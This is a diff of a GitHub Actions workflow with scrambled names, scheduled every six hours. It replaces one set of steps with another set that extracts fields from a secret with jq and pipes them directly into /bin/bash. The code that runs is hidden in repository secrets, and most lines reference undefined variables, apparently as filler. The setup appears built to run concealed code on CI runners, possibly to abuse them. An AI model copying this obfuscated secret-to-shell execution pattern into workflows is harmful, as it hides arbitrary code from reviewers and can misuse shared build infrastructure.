@@ -1,33 +1,26 @@
 name: mingyulu1837
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
-
+    - cron: '41 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          idx11: ${{ secrets.idx11 }}
+          qm24: ${{ secrets.qm24 }}
         run: |
-          echo $idx11 | jq -r .howgk78 | /bin/bash
-          echo $fhkv4 | jq -r .x13142 | /bin/bash
-          echo $joq4821 | jq -r .orhss2802 | /bin/bash
-          echo $q94 | jq -r .moz9504 | /bin/bash
-          echo $yrpqz2279 | jq -r .n2 | /bin/bash
-          echo $sebu920 | jq -r .loeu23591 | /bin/bash
-          echo $xnvq0 | jq -r .aolui934 | /bin/bash
-          echo $km91521 | jq -r .fkc631 | /bin/bash
-          echo $u1 | jq -r .rzno47 | /bin/bash
-          echo $tknlb9899 | jq -r .mne904 | /bin/bash
-          echo $pen67991 | jq -r .z331 | /bin/bash
-          echo $ybctl460 | jq -r .hpo08643 | /bin/bash
-          echo $y8 | jq -r .romu3401 | /bin/bash
-          echo $ikyx2 | jq -r .s026 | /bin/bash
-          echo $p0 | jq -r .rjyk5731 | /bin/bash
-          echo $f72 | jq -r .nvf120 | /bin/bash
+          echo $qm24 | jq -r .ssvvv56501 | /bin/bash
+          echo $trb699 | jq -r .lrqv2861 | /bin/bash
+          echo $wubv1 | jq -r .cs80349 | /bin/bash
+          echo $fbnsx42189 | jq -r .bi06259 | /bin/bash
+          echo $y15 | jq -r .x26 | /bin/bash
+          echo $kiekj71166 | jq -r .qtv06 | /bin/bash
+          echo $xyqk809 | jq -r .iz23389 | /bin/bash
+          echo $xp3 | jq -r .n2155 | /bin/bash
+          echo $wimlo6296 | jq -r .pt111 | /bin/bash
+          echo $fq99 | jq -r .zp3 | /bin/bash
 
